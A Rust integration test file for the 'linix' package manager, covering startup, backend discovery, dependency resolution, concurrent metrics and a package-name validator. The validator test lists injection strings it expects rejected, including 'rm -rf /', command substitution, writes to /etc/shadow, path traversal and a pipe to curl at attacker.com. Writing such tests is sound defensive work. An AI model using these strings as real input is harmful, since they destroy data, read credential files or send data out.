use linix::app::App;
use linix::config::Config;
use linix::core::{Package, PackageSpec, Validator, Backend, GraphAction};
use linix::backends::github::GithubManager;
use std::collections::HashMap;

/// Integration test for the high-performance application kernel.
/// Verifies that the App can initialize, discover backends, and handle 
/// recursive dependency resolution for the DAG.
#[tokio::test]
async fn test_app_initialization_v3() {
    let config = Config::default();
    let app = App::new(config).await;
    
    // Ensure the application kernel starts and the WAL journal is initialized.
    assert!(app.is_ok(), "App failed to initialize: {:?}", app.err());
    
    let app = app.unwrap();
    // Verify that the LockMap registry is populated.
    let backends = app.available_backends();
    assert!(!backends.is_empty(), "No backends discovered. Ensure tools like 'apt' or 'cargo' are in PATH.");
}

/// Verifies that the Interface Query pattern works for capability discovery.
#[tokio::test]
async fn test_backend_capability_discovery_solid() {
    let config = Config::default();
    let app = App::new(config).await.unwrap();
    
    // GitHub is a 'Logic Backend' and should always be present.
    let github = app.registry.get("github").expect("GitHub backend missing from registry");
    
    // ISP (Interface Segregation Principle) Check
    assert!(github.as_installable().is_some(), "GitHub must implement Installable");
    assert!(github.as_queryable().is_some(), "GitHub must implement Queryable");
    assert!(github.as_searchable().is_none(), "GitHub should not implement Searchable in this build");
}

/// Tests the recursive resolution engine which builds the inputs for the DAG.
#[tokio::test]
async fn test_dag_dependency_resolution() {
    let mut config = Config::default();
    // Setup an alias to test resolution path (Roadmap Phase 2.2)
    config.aliases.insert("sys".into(), "apt".into());
    
    let app = App::new(config).await.unwrap();
    
    // Complex spec with meta-dependencies: 
    // neovim requires gcc (apt) and ripgrep (brew)
    let spec_str = "sys:neovim@requires=apt:gcc;brew:ripgrep";
    
    let resolved = app.resolve_spec(spec_str).expect("Resolution failed");
    
    // We expect 3 distinct PackageSpecs in the result
    assert_eq!(resolved.len(), 3, "Resolver failed to expand dependencies correctly.");
    
    assert!(resolved.iter().any(|s| s.name == "neovim" && s.backend == "apt"));
    assert!(resolved.iter().any(|s| s.name == "gcc" && s.backend == "apt"));
    assert!(resolved.iter().any(|s| s.name == "ripgrep" && s.backend == "brew"));
}

/// Tests the Mission-Critical Security Validator (Roadmap Phase 3).
#[tokio::test]
async fn test_security_validator_hardened() {
    // Valid alphanumeric and safe symbols
    assert!(Validator::validate_package_name("valid-pkg-123.stable").is_ok());
    
    // Destructive and injection patterns
    let dangerous_inputs = vec![
        "pkg; rm -rf /",
        "pkgname$(whoami)",
        "pkgname > /etc/shadow",
        "../../etc/passwd",
        "pkgname | curl http://attacker.com",
    ];
    
    for input in dangerous_inputs {
        assert!(
            Validator::validate_package_name(input).is_err(), 
            "Security vulnerability: Validator failed to block: {}", input
        );
    }
}

/// Verifies that the Parallel Metrics Collector is thread-safe.
#[tokio::test]
async fn test_parallel_telemetry() {
    let metrics = linix::app::MetricsCollector::new();
    let start = chrono::Utc::now();

    // Simulate concurrent task updates
    let m1 = metrics.clone();
    let t1 = tokio::spawn(async move {
        m1.record_operation("task1", "apt", start, true, None);
    });

    let m2 = metrics.clone();
    let t2 = tokio::spawn(async move {
        m2.record_operation("task2", "cargo", start, false, Some("Network error".into()));
    });

    let _ = tokio::join!(t1, t2);
    
    // Metrics inner should have 2 operations recorded safely
    // (This is a logic check, summary is usually printed to stdout)
    metrics.print_summary();
}

/// Tests the ETag/Fingerprint logic for the Web Backend.
#[tokio::test]
async fn test_web_fingerprint_logic() {
    let executor = linix::core::CommandExecutor::new(true, false);
    let manager = linix::backends::web::WebManager::new(executor);
    
    // Check internal name
    assert_eq!(Backend::name(&manager), "web");
}